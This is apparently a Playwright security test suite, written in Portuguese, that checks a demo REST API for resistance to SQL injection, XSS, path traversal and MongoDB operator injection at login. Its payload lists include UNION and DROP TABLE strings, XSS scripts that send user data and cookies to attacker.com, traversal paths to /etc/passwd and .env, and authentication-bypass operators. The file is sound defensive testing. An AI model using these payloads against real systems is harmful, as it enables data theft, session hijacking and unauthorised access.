/**
 * Testes de Segurança - Injeção
 *
 * Objetivo: validar proteção contra ataques de injeção
 * Abordagem: OWASP Top 10 - A03:2021 (Injection)
 *            OWASP ASVS - V5 (Input Validation)
 */

import { test, expect, request } from "@playwright/test";
import { createAuthenticatedClient } from "../fixtures/auth.fixture";
import { ApiClient } from "../client/ApiClient";
import { AllureHelper } from "../utils/allure-helper";

test.describe("Testes de Injeção - CT-SEC", () => {
  let adminClient: ApiClient;
  let adminApiContext: any;

  test.beforeAll(async () => {
    const auth = await createAuthenticatedClient();
    adminClient = auth.client;
    adminApiContext = auth.apiContext;
  });

  test.afterAll(async () => {
    if (adminApiContext) {
      await adminApiContext.dispose();
    }
  });

  test("CT-SEC-01: SQL Injection em busca de produtos", async () => {
    AllureHelper.addSeverity("critical");
    AllureHelper.addTags("security", "injection", "sql");
    AllureHelper.addDescription(
      "Valida se a API está protegida contra SQL Injection nos parametros de busca. " +
        "Testa diferentes payloads que tentam modificar a query original para " +
        "retornar dados indevidos ou quebrar a consulta."
    );
    AllureHelper.addTestCaseId("CT-SEC-01");
    AllureHelper.addFeature("Segurança - Injeção");
    AllureHelper.addStory("SQL Injection");

    const legitResponse = await adminClient.get("/produtos?nome=computador");
    expect(legitResponse.status()).toBe(200);
    const legitData = await legitResponse.json();
    const legitCount = Array.isArray(legitData) ? legitData.length : 0;

    await AllureHelper.addAttachment(
      "Busca legítima",
      JSON.stringify({ termo: "computador", quantidade: legitCount }, null, 2),
      "application/json"
    );

    const sqlPayloads = [
      { payload: "' OR '1'='1' -- ", descricao: "OR sempre verdadeiro" },
      { payload: "' UNION SELECT nome, email, senha FROM usuarios -- ", descricao: "UNION para extrair dados" },
      { payload: "nome' AND '1'='1' -- ", descricao: "Comentário para ignorar cláusulas" },
      { payload: "nome' OR 1=1 -- ", descricao: "OR 1=1" },
      { payload: "100' OR '1'='1' -- ", descricao: "Campo numérico com OR" },
      { payload: "'; DROP TABLE produtos; -- ", descricao: "Tentativa de DROP TABLE" },
      { payload: "%27%20OR%20%271%27%3D%271", descricao: "URL encoded" },
      { payload: "nome' OR 'a'='a' -- ", descricao: "OR com comparacao de strings" }
    ];

    let encontrouIndicio = false;

    for (const sql of sqlPayloads) {
      await AllureHelper.addStep(
        `Testando payload: ${sql.descricao}`,
        async () => {
          const response = await adminClient.get(`/produtos?nome=${encodeURIComponent(sql.payload)}`);
          
          if (response.status() >= 400) {
            return;
          }

          const body = await response.json();
          
          if (!Array.isArray(body)) {
            return;
          }

          if (body.length > legitCount) {
            encontrouIndicio = true;
            console.log(`[ALERTA] SQL Injection detectada com payload: ${sql.payload}`);
            console.log(`Resultados: ${body.length} vs ${legitCount} esperados`);
            
            await AllureHelper.addAttachment(
              `Indicio SQL Injection - ${sql.descricao}`,
              JSON.stringify({ 
                payload: sql.payload, 
                retornou: body.length,
                esperado: legitCount,
                amostra: body.slice(0, 3)
              }, null, 2),
              "application/json"
            );

            expect(body.length).toBeLessThanOrEqual(legitCount + 5);
          }

          if (body.length > 0) {
            const firstItem = body[0];
            if (firstItem && (firstItem.senha || firstItem.password || firstItem.email)) {
              encontrouIndicio = true;
              console.log(`[ALERTA] UNION SQL Injection detectada - dados sensiveis extraidos`);
              
              await AllureHelper.addAttachment(
                `UNION Injection - ${sql.descricao}`,
                JSON.stringify({ 
                  payload: sql.payload, 
                  campos: Object.keys(firstItem),
                  amostra: firstItem
                }, null, 2),
                "application/json"
              );

              expect(firstItem).not.toHaveProperty('senha');
              expect(firstItem).not.toHaveProperty('password');
              expect(firstItem).not.toHaveProperty('email');
            }
          }
        }
      );
    }

    if (!encontrouIndicio) {
      console.log("Nenhum indicio de SQL Injection foi encontrado.");
    }
  });

  test("CT-SEC-02: XSS em cadastro de usuário", async () => {
    AllureHelper.addSeverity("critical");
    AllureHelper.addTags("security", "injection", "xss");
    AllureHelper.addDescription(
      "Valida se a API sanitiza entradas que contem codigo JavaScript. " +
        "Cadastra um usuario com payload XSS e verifica se o valor armazenado " +
        "foi sanitizado ou removido."
    );
    AllureHelper.addTestCaseId("CT-SEC-02");
    AllureHelper.addFeature("Segurança - Injeção");
    AllureHelper.addStory("Cross-Site Scripting (XSS)");

    const xssPayloads = [
      `<script>fetch('/usuarios').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal', {method:'POST',body:JSON.stringify(d)}))</script>`,
      `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`,
      `<svg><script>alert(document.domain)</script></svg>`,
      `<iframe src="javascript:alert('XSS')">`,
      `<body onload="alert('XSS')">`,
      `%3Cscript%3Ealert('XSS')%3C/script%3E`,
      `" onmouseover="alert('XSS')"`,
      `João<script>alert('XSS')</script>`
    ];

    let encontrouVulnerabilidade = false;

    for (const payload of xssPayloads) {
      await AllureHelper.addStep(
        `Testando payload XSS: ${payload.substring(0, 30)}...`,
        async () => {
          const email = `xss_${Date.now()}_${Math.random().toString(36).substring(7)}@test.com`;
          
          const userData = {
            nome: payload,
            email: email,
            password: '123456',
            administrador: 'false'
          };

          const response = await adminClient.post('/usuarios', userData);
          
          if (response.status() >= 400) {
            return;
          }

          const body = await response.json();
          
          if (!body._id) {
            return;
          }

          const getResponse = await adminClient.get(`/usuarios/${body._id}`);
          const userBody = await getResponse.json();

          const nome = userBody.nome || '';
          
          const hasHtmlTag = /<[^>]*>/.test(nome);
          const hasEventHandler = /on\w+\s*=|javascript:/i.test(nome);
          
          if (hasHtmlTag || hasEventHandler) {
            encontrouVulnerabilidade = true;
            console.log(`[ALERTA] XSS detectado - payload nao sanitizado: ${payload}`);
            console.log(`Valor armazenado: ${nome}`);
            
            await AllureHelper.addAttachment(
              `XSS Detectado`,
              JSON.stringify({ 
                payload: payload, 
                armazenado: nome,
                contemTag: hasHtmlTag,
                contemEventHandler: hasEventHandler
              }, null, 2),
              "application/json"
            );

            expect(hasHtmlTag).toBe(false);
            expect(hasEventHandler).toBe(false);
          }

          await adminClient.delete(`/usuarios/${body._id}`);
        }
      );
    }

    if (!encontrouVulnerabilidade) {
      console.log("Nenhum indicio de XSS foi encontrado.");
    }
  });

  test("CT-SEC-03: Path Traversal", async () => {
    AllureHelper.addSeverity("critical");
    AllureHelper.addTags("security", "injection", "path-traversal");
    AllureHelper.addDescription(
      "Valida se a API esta protegida contra ataques de Path Traversal. " +
        "Tenta acessar arquivos sensiveis do servidor atraves de parametros."
    );
    AllureHelper.addTestCaseId("CT-SEC-03");
    AllureHelper.addFeature("Segurança - Injeção");
    AllureHelper.addStory("Path Traversal");

    const pathPayloads = [
      { payload: '../../../etc/passwd', sensitive: ['root:', 'bin:', 'daemon:'] },
      { payload: '../../../.env', sensitive: ['DATABASE_', 'SECRET_', 'API_'] },
      { payload: '../../../package.json', sensitive: ['dependencies', 'scripts'] },
      { payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', sensitive: ['root:', 'bin:'] },
      { payload: '..\\..\\..\\windows\\win.ini', sensitive: ['; for 16-bit'] },
      { payload: '../../server.js', sensitive: ['require(', 'express'] },
      { payload: '../config/database.json', sensitive: ['host', 'port'] }
    ];

    let encontrouIndicio = false;

    for (const path of pathPayloads) {
      await AllureHelper.addStep(
        `Testando Path Traversal: ${path.payload}`,
        async () => {
          const endpoints = [
            `/produtos?nome=${encodeURIComponent(path.payload)}`,
            `/usuarios?email=${encodeURIComponent(path.payload)}`
          ];

          for (const endpoint of endpoints) {
            const response = await adminClient.get(endpoint);
            
            if (response.status() >= 400) {
              continue;
            }

            const body = await response.text();
            
            for (const sensitive of path.sensitive) {
              if (body.includes(sensitive)) {
                encontrouIndicio = true;
                console.log(`[ALERTA] Path Traversal detectado em ${endpoint}`);
                console.log(`Payload: ${path.payload}`);
                console.log(`Conteudo sensivel encontrado: ${sensitive}`);
                
                await AllureHelper.addAttachment(
                  `Path Traversal Detectado`,
                  JSON.stringify({ 
                    endpoint: endpoint,
                    payload: path.payload, 
                    sensitive: sensitive,
                    preview: body.substring(0, 200)
                  }, null, 2),
                  "application/json"
                );

                expect(body).not.toContain(sensitive);
              }
            }
          }
        }
      );
    }

    if (!encontrouIndicio) {
      console.log("Nenhum indicio de Path Traversal foi encontrado.");
    }
  });

  test("CT-SEC-10: NoSQL Injection no login", async () => {
    AllureHelper.addSeverity("critical");
    AllureHelper.addTags("security", "injection", "nosql");
    AllureHelper.addDescription(
      "Valida se a API esta protegida contra NoSQL Injection no endpoint de login. " +
        "Tenta usar operadores do MongoDB para contornar a autenticacao."
    );
    AllureHelper.addTestCaseId("CT-SEC-10");
    AllureHelper.addFeature("Segurança - Injeção");
    AllureHelper.addStory("NoSQL Injection");

    const tempApiContext = await request.newContext({
      baseURL: process.env.API_BASE_URL || "https://serverest.dev",
    });
    const tempClient = new ApiClient(
      tempApiContext,
      process.env.API_BASE_URL || "https://serverest.dev"
    );

    const legitEmail = `test_${Date.now()}@test.com`;
    const legitPassword = 'senha123';
    
    await tempClient.post('/usuarios', {
      nome: 'Usuario Teste',
      email: legitEmail,
      password: legitPassword,
      administrador: 'false'
    });

    const noSqlPayloads = [
      { 
        payload: { email: { '$ne': null }, password: { '$ne': null } },
        descricao: "$ne null em ambos campos"
      },
      { 
        payload: { email: { '$gt': '' }, password: { '$gt': '' } },
        descricao: "$gt vazio"
      },
      { 
        payload: { email: { '$regex': '.*' }, password: { '$regex': '.*' } },
        descricao: "$regex para capturar qualquer email"
      },
      { 
        payload: { email: { '$in': ['admin@email.com', legitEmail] }, password: legitPassword },
        descricao: "$in com lista de emails"
      },
      { 
        payload: { '$or': [{ 'email': legitEmail }, { 'email': { '$ne': null } }], 'password': legitPassword },
        descricao: "$or para combinar condicoes"
      },
      { 
        payload: { email: { '$ne': 'admin@email.com' }, password: '123456' },
        descricao: "$ne para admin especifico"
      }
    ];

    let encontrouVulnerabilidade = false;

    for (const noSql of noSqlPayloads) {
      await AllureHelper.addStep(
        `Testando NoSQL Injection: ${noSql.descricao}`,
        async () => {
          const response = await tempClient.post('/login', noSql.payload);
          
          if (response.status() === 200) {
            const body = await response.json();
            
            if (body.authorization) {
              encontrouVulnerabilidade = true;
              console.log(`[ALERTA CRITICO] NoSQL Injection bem-sucedida`);
              console.log(`Payload: ${JSON.stringify(noSql.payload)}`);
              
              await AllureHelper.addAttachment(
                `NoSQL Injection Detectada - ${noSql.descricao}`,
                JSON.stringify({ 
                  payload: noSql.payload,
                  token: body.authorization.substring(0, 30) + '...'
                }, null, 2),
                "application/json"
              );

              expect(response.status()).toBe(401);
            }
          }
        }
      );
    }

    await tempClient.delete(`/usuarios?email=${encodeURIComponent(legitEmail)}`);
    await tempApiContext.dispose();

    if (!encontrouVulnerabilidade) {
      console.log("Nenhum indicio de NoSQL Injection foi encontrado.");
    }
  });
});
